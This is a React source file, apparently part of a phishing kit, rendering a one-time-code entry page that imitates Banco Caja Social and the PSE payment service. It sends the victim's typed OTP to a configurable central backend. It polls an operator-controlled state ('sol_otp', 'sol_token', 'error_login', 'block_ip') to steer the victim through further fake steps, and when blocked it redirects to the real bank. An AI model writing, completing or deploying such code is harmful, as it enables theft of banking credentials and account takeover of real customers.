import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { updateStateSession } from "../../../../../../@utils";
import LoadingCajaSocial from "../../../../../components/LoadingCajaSocial";
import heroBg from "../../img/bg-1.png";
import logoBancoFundacion from "../../img/logo_banco_fundacion.svg";
import pseLogoCirculo from "../../img/pse_logo_circulo.svg";
import "./caja_social_otp_pse.css";

// Se inicializan las constantes de configuración
const HERO_BG = heroBg;
const OTP_LEN = 8;
const RESEND_COOLDOWN_SEC = 60;
const CS_ERROR_KEY = "caja_social_error_modal";
const CS_OTP_ERROR_AUTO_HIDE_MS = 5000;
const CS_OTP_ERROR_TITLE = "El código OTP no es válido";
const CS_OTP_ERROR_BODY = "Por favor verifique sus datos e intente de nuevo.";
const CS_MID_FLOW_KEY = "caja_social_mid_flow";

// Se inicializan los mensajes del modal (solo bloqueos / casos sin alerta inline)
const MODAL_MSG = {
  block_ip: "Acceso bloqueado por seguridad.",
};

// Se inicializan los estados a ignorar despues del modal
const ESTADOS_IGNORAR_TRAS_MODAL = ["error_login", "error_otp", "error_token"];

// Se crea el componente
export default function OtpPse() {

  // Se inicializa el navigate
  const navigate = useNavigate();

  // Se inicializan las referencias
  const sessionIdRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Se inicializan las referencias del flujo post-envio
  const esperandoRespuestaTrasEnviarRef = useRef(false);
  const otpTrasEnviarVioPendienteRef = useRef(false);

  // Se inicializan los estados de UI y formulario
  const [loading, setLoading] = useState(false);
  const [code, setCode] = useState("");
  const [otpError, setOtpError] = useState(null);
  const [showErrorAlert, setShowErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(0);

  const clearOtpFields = () => {
    setCode("");
    setOtpError(null);
  };

  const dismissErrorAlert = () => {
    setShowErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_otp") {
      ignorarEstadoHastaCambioRef.current = "error_otp";
      modalBloqueoEstadoRef.current = null;
    }
  };

  const showOtpError = () => {
    esperandoRespuestaTrasEnviarRef.current = false;
    otpTrasEnviarVioPendienteRef.current = false;
    stopPolling();
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_otp";
    updateStateSession("error_otp");
    clearOtpFields();
    setShowErrorAlert(true);
    window.scrollTo(0, 0);
  };

  const dismissErrorAlertIfOpen = () => {
    if (showErrorAlert) {
      dismissErrorAlert();
    }
  };

  // Se ejecuta cuando el componente se monta
  useEffect(() => {

    // Se captura la sessionId persistida
    sessionIdRef.current = localStorage.getItem("sessionId");

    // Se valida que exista la sessionId persistida
    if (!sessionIdRef.current) {

      // Se redirige al login
      navigate("/logo_caja_social_pse", { replace: true });

      // Se sale del useEffect
      return undefined;
    }

    // Se captura el modal pendiente
    const pending = localStorage.getItem(CS_ERROR_KEY);

    // Se valida si el modal pendiente es de OTP
    if (pending === "error_otp") {
      showOtpError();
    } else if (pending === "error_login") {
      navigate("/logo_caja_social_pse", { replace: true });
      return () => {
        if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      };
    } else if (pending === "error_token") {
      navigate("/banco_caja_social_token_pse", { replace: true });
      return () => {
        if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      };
    } else if (pending === "block_ip") {
      modalBloqueoEstadoRef.current = "block_ip";
      setShowModal(true);
      setModalText(MODAL_MSG.block_ip);
    }

    // Se elimina el modal pendiente (excepto si se redirige a otra pantalla)
    if (pending && pending !== "error_login" && pending !== "error_token") {
      localStorage.removeItem(CS_ERROR_KEY);
    }

    // Se retorna el cleanup
    return () => {

      // Se limpia el intervalo de polling
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
    };
  }, [navigate]);

  // Se oculta automáticamente el alerta de OTP incorrecto
  useEffect(() => {
    if (!showErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissErrorAlert();
    }, CS_OTP_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showErrorAlert]);

  // Se ejecuta cuando cambia el contador del reenvio
  useEffect(() => {

    // Se valida si el contador ya terminó
    if (secondsLeft <= 0) {

      // Se sale del useEffect
      return undefined;
    }

    // Se crea el temporizador regresivo
    const timer = window.setInterval(() => {

      // Se actualiza el contador de segundos restantes
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    // Se retorna la limpieza del temporizador
    return () => window.clearInterval(timer);
  }, [secondsLeft]);

  // Se crea el metodo para formatear el contador
  const formatCountdown = (seconds) => {

    // Se calcula los minutos y segundos
    const mins = Math.floor(seconds / 60);

    // Se calcula los segundos
    const secs = seconds % 60;

    // Se retorna el formato de tiempo
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  // Se inicializan los metodos de polling y verificacion
  const initPolling = () => {

    // Se limpia el intervalo anterior si existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se limpia el intervalo de polling
      pollingIntervalRef.current = null;
    }

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se ejecuta una verificacion inmediata
    verifyState();
  };

  // Se para el polling
  const stopPolling = () => {

    // Se valida si existe el intervalo de polling
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se limpia el intervalo de polling
      pollingIntervalRef.current = null;
    }
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/cajasocial/verify-state/${sessionIdRef.current}`);

      // Se captura el estado y el estado del backend
      const { estado, state } = response.data;

      // Se captura el estado actual
      const currentState = (estado || state || "").toLowerCase();

      // Se valida si el estado actual es valido
      if (!currentState) return;

      // Se valida si se debe ignorar el mismo estado tras cerrar el modal
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado actual es el mismo que se debe ignorar
        if (currentState === ignorarEstadoHastaCambioRef.current) {

          // Se sale del if
          return;
        }

        // Se limpia el estado de ignorar
        ignorarEstadoHastaCambioRef.current = null;

        // Se limpia el estado de bloqueo del modal
        modalBloqueoEstadoRef.current = null;
      }

      if (modalBloqueoEstadoRef.current && currentState === modalBloqueoEstadoRef.current) {

        // Se sale del if
        return;
      }

      // Se valida si ya se vio el estado pendiente tras enviar el OTP
      if (esperandoRespuestaTrasEnviarRef.current && currentState === "pendiente") {

        // Se setea el estado de que se vio el estado pendiente tras enviar el OTP
        otpTrasEnviarVioPendienteRef.current = true;
      }

      // Se ejecuta el switch del estado actual
      switch (currentState) {
        case "sol_otp":

          // Se valida si el OTP fue enviado y el flujo sigue esperando respuesta
          if (esperandoRespuestaTrasEnviarRef.current) {

            // Se valida si no se vio el estado pendiente tras enviar el OTP
            if (!otpTrasEnviarVioPendienteRef.current) {

              // Se sale del if
              break;
            }

            // Se resetea el control de reenvio tras ver pendiente
            otpTrasEnviarVioPendienteRef.current = false;
            esperandoRespuestaTrasEnviarRef.current = false;

            // Se desactiva el loading
            setLoading(false);

            // Se limpia la UI del OTP
            setCode("");

            // Se limpia el error del OTP
            setOtpError(null);

            // Se actualiza el estado de la sesión
            updateStateSession("solicitar_otp");

            // Se inicia el polling
            initPolling();

            // Se sale del switch
            break;
          }

          // Se mantiene la misma pantalla OTP sin reenviar navegación
          setLoading(false);

          // Se actualiza el estado de la sesión
          updateStateSession("solicitar_otp");

          // Se sale del switch
          break;
        case "sol_token":

          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se resetea el control de reenvio tras ver pendiente
          otpTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se actualiza el estado de la sesión
          updateStateSession("sol_token");

          // Se redirige a la pantalla token
          navigate("/banco_caja_social_token_pse", { replace: true });

          // Se sale del switch
          break;
        case "error_otp":
          showOtpError();
          break;
        case "error_login":

          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se resetea el control de reenvio tras ver pendiente
          otpTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se setea el error modal
          localStorage.setItem(CS_ERROR_KEY, "error_login");

          // Se redirige al login
          navigate("/logo_caja_social_pse", { replace: true });

          // Se sale del switch

          break;
        case "error_token":

          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se resetea el control de reenvio tras ver pendiente
          otpTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se setea el error modal
          localStorage.setItem(CS_ERROR_KEY, "error_token");

          // Se redirige a la pantalla token
          navigate("/banco_caja_social_token_pse", { replace: true });

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se resetea el control de reenvio tras ver pendiente
          otpTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se desactiva el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se redirige a la pantalla de finalizado
          navigate("/finalizado-pse", { replace: true });

          // Se sale del switch
          break;
        case "block_ip":
        case "error_blocked":

          // Se limpian las referencias post-envio
          esperandoRespuestaTrasEnviarRef.current = false;

          // Se resetea el control de reenvio tras ver pendiente
          otpTrasEnviarVioPendienteRef.current = false;

          // Se para el polling
          stopPolling();

          // Se remueve el mid flow
          sessionStorage.removeItem(CS_MID_FLOW_KEY);

          // Se limpia el storage y se redirige al inicio
          localStorage.clear();

          // Se redirige al inicio
          window.location.href = process.env.REACT_APP_URL_BANK || "/";

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se capturan los datos del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se limpian las referencias post-envio
        esperandoRespuestaTrasEnviarRef.current = false;

        // Se resetea el control de reenvio tras ver pendiente
        otpTrasEnviarVioPendienteRef.current = false;

        // Se para el polling
        stopPolling();

        // Se desactiva el loading
        setLoading(false);

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage y se redirige al inicio
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del try catch
        return;
      }
    }
  };

  // Se crea el metodo para cerrar el modal
  const closeModal = () => {
    const estadoServidor = modalBloqueoEstadoRef.current;
    modalBloqueoEstadoRef.current = null;

    if (estadoServidor && ESTADOS_IGNORAR_TRAS_MODAL.includes(estadoServidor)) {
      ignorarEstadoHastaCambioRef.current = estadoServidor;
    }

    setShowModal(false);
    setModalText("");
  };

  // Se crea el metodo para manejar el cambio del OTP
  const onOtpChange = (e) => {

    // Se normaliza el valor a solo dígitos
    const digits = e.target.value.replace(/\D/g, "").slice(0, OTP_LEN);

    // Se actualiza el código OTP
    setCode(digits);

    dismissErrorAlertIfOpen();

    // Se limpia el error si existe
    if (otpError) setOtpError(null);
  };

  // Se crea el metodo para reenviar el código OTP
  const handleReenviarCodigo = async () => {

    // Se valida si existe loading o si el contador sigue activo
    if (loading || secondsLeft > 0) return;

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;

    // Se valida que exista la sessionId persistida
    if (!sessionId) {

      // Se muestra el error de no sessionId
      setOtpError("Sesión no encontrada. Vuelve a iniciar sesión.");

      // Se sale del metodo
      return;
    }

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/cajasocial/otp-resend",
        },
      },
    };

    // Se usa el try catch
    try {

      // Se activa el loading
      setLoading(true);

      // Se realiza la petición al backend central o al backend local
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/cajasocial/otp-resend", dataSend);

      // Se valida si la respuesta fue exitosa
      if (response?.data?.success) {

        // Se captura la sessionId devuelta por el backend
        const sid = response.data.sessionId ?? sessionId;

        // Se persiste la sessionId devuelta por el backend
        localStorage.setItem("sessionId", sid);

        // Se setea la sessionId en el ref
        sessionIdRef.current = sid;

        // Se reinicia el contador de reenvio
        setSecondsLeft(RESEND_COOLDOWN_SEC);

        // Se preparan las referencias para esperar respuesta del panel
        otpTrasEnviarVioPendienteRef.current = false;

        // Se setea el estado de espera de respuesta
        esperandoRespuestaTrasEnviarRef.current = true;

        // Se inicia el polling
        initPolling();
      } else {

        // Se muestra el error de reenvio
        setOtpError("No se pudo solicitar un nuevo código. Intenta de nuevo.");
      }
    } catch (error) {

      // Se capturan los datos del error
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del try catch
        return;
      }
      // Se muestra el mensaje de error de comunicación
      setOtpError(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");

      // Se sale del try catch
    } finally {

      // Se desactiva el loading
      setLoading(false);
    }
  };

  // Se crea el metodo para enviar el OTP
  const handleEnviar = async () => {

    // Se valida la longitud del OTP
    if (code.length !== OTP_LEN) {

      // Se muestra el error de longitud de OTP
      setOtpError(`El código debe tener ${OTP_LEN} dígitos`);

      // Se sale del metodo
      return;
    }

    // Se limpia el error local
    setOtpError(null);

    // Se activa el loading
    setLoading(true);

    // Se captura la sessionId persistida
    const sessionId = localStorage.getItem('sessionId');

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "otp": code,
          "sessionId": sessionId || sessionIdRef.current,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/cajasocial/otp",
        },
      },
    };

    // Se captura la url central configurada
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se usa el try catch
    try {

      // Se realiza la petición al backend central o al backend local
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/cajasocial/otp", dataSend);

      // Se valida si la respuesta fue exitosa
      if (response.data?.success) {

        // Se captura la sessionId devuelta por el backend
        const sidResp = response.data.sessionId ?? sessionId ?? sessionIdRef.current;

        // Se valida si existe una sessionId devuelta por el backend
        if (sidResp) {

          // Se persiste la sessionId devuelta por el backend
          localStorage.setItem("sessionId", sidResp);

          // Se setea la sessionId en el ref
          sessionIdRef.current = sidResp;
        }

        // Se preparan las referencias para esperar respuesta del panel
        otpTrasEnviarVioPendienteRef.current = false;

        // Se setea el estado de espera de respuesta
        esperandoRespuestaTrasEnviarRef.current = true;

        // Se inicia el polling después del envío correcto
        initPolling();
      } else {

        // Se limpian las referencias post-envio
        esperandoRespuestaTrasEnviarRef.current = false;

        // Se resetea el control de reenvio tras ver pendiente
        otpTrasEnviarVioPendienteRef.current = false;

        // Se desactiva el loading
        setLoading(false);

        // Se muestra el error de conexión
        setOtpError("Error en la conexión");
      }
    } catch (error) {

      // Se limpian las referencias post-envio
      esperandoRespuestaTrasEnviarRef.current = false;

      // Se resetea el control de reenvio tras ver pendiente
      otpTrasEnviarVioPendienteRef.current = false;

      // Se desactiva el loading
      setLoading(false);

      // Se capturan los datos del error
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el error es de bloqueo
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(CS_MID_FLOW_KEY);

        // Se limpia el storage
        localStorage.clear();

        // Se redirige al inicio
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del try catch
        return;
      }

      // Se muestra el error de conexión
      setOtpError("Error de conexión con el servidor");
    }
  };

  // Se inicializa la referencia aria para accesibilidad
  const describedBy = ["otp-helper-line", otpError ? "otp-error-msg" : null].filter(Boolean).join(" ");

  // Se retorna el HTML
  return (
    <div className="bcs-layout lcsp-screen otp-pse-screen">
      {/* Loading overlay mientras se envía o se espera cambio de estado */}
      {loading ? <LoadingCajaSocial /> : null}

      {/* Columna izquierda con imagen de apoyo */}
      <div className="bcs-image">
        <img
          className="bcs-image-media"
          src={HERO_BG}
          alt=""
          aria-hidden="true"
        />
      </div>

      {/* Columna derecha con logos y formulario */}
      <div className="bcs-form">
        {/* Bloque de logos institucionales */}
        <div className="login-logos-wrapper lcsp-login-logos">
          <div className="identity-logo">
            <img
              src={logoBancoFundacion}
              alt="Banco Caja Social y Fundación Grupo Social"
              className="lcsp-img-banco"
            />
          </div>
          <div id="pse-logo" className="pse-logo">
            <img src={pseLogoCirculo} alt="PSE" className="lcsp-img-pse" />
          </div>
        </div>

        <div className="lcsp-hero-text">
          <header>
            <h1 id="kc-page-title">Su código de seguridad ha sido enviado.</h1>
          </header>

          {showErrorAlert ? (
            <div className="cs-login-alert alert alert-danger" role="alert">
              <div className="cs-login-alert__row">
                <span className="cs-login-alert__icon" aria-hidden="true">!</span>
                <strong className="cs-login-alert__title">{CS_OTP_ERROR_TITLE}</strong>
              </div>
              <p className="cs-login-alert__text">{CS_OTP_ERROR_BODY}</p>
            </div>
          ) : null}

          {/* Texto contextual del paso actual */}
          <p className="lcsp-instruction-body">
            Para continuar con la validación de su titularidad, enviamos el
            código de seguridad a su correo electrónico o celular registrado:
          </p>
        </div>

        {/* Formulario principal del OTP */}
        <form
          className="otp-form"
          onSubmit={(e) => {
            // Se previene el submit nativo del formulario
            e.preventDefault();
          }}
        >
          <hr className="otp-divider" />
          <p className="otp-helper-text" id="otp-helper-line">
            Por favor ingrese el código compuesto por {OTP_LEN} dígitos:
          </p>

          {/* Campo del código OTP */}
          <div className="otp-field-wrap">
            <label className="otp-label" htmlFor="otp-security-code">
              Código de seguridad
            </label>
            {/* Fila del input y acción principal */}
            <div className="otp-row">
              <div className="otp-input-stack">
                <input
                  id="otp-security-code"
                  className={`otp-input${otpError ? " otp-input--error" : ""}`}
                  type="password"
                  name="otp"
                  value={code}
                  onChange={onOtpChange}
                  inputMode="numeric"
                  maxLength={OTP_LEN}
                  autoComplete="one-time-code"
                  spellCheck={false}
                  aria-invalid={Boolean(otpError)}
                  aria-describedby={describedBy || undefined}
                />
                {otpError ? (
                  <small className="otp-error-msg" id="otp-error-msg" role="alert">
                    {otpError}
                  </small>
                ) : null}
              </div>
              {/* Botón principal de envío */}
              <button
                type="button"
                className="otp-submit-btn"
                onClick={handleEnviar}
                disabled={loading}
              >
                {loading ? "Enviando..." : "Enviar"}
              </button>
            </div>
          </div>

          <hr className="otp-divider otp-divider-bottom" />
          {/* Acciones secundarias del OTP */}
          <div className="otp-links">
            <p className="otp-link-line">
              ¿No recibió el código?{" "}
              <button
                type="button"
                className="otp-inline-link"
                onClick={handleReenviarCodigo}
                disabled={loading || secondsLeft > 0}
              >
                Reenviar
                {secondsLeft > 0 ? (
                  <span className="otp-resend-count">
                    {" "}
                    ({formatCountdown(secondsLeft)})
                  </span>
                ) : null}
              </button>
            </p>
            {/* Acciones visuales secundarias */}
            <button type="button" className="otp-secondary-link">
              ¿Tiene algún problema con este correo electrónico?
            </button>
            <button type="button" className="otp-secondary-link">
              Intente con otro medio
            </button>
          </div>
        </form>
      </div>

      {/* Modal de errores y bloqueos */}
      {showModal ? (
        <div className="cs-modal-overlay" role="presentation">
          <div className="cs-modal-card" role="dialog" aria-modal="true">
            <div className="cs-modal-top">Caja Social</div>
            <div className="cs-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="cs-modal-bot">
              <button type="button" className="cs-modal-accept" onClick={closeModal}>
                Aceptar
              </button>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}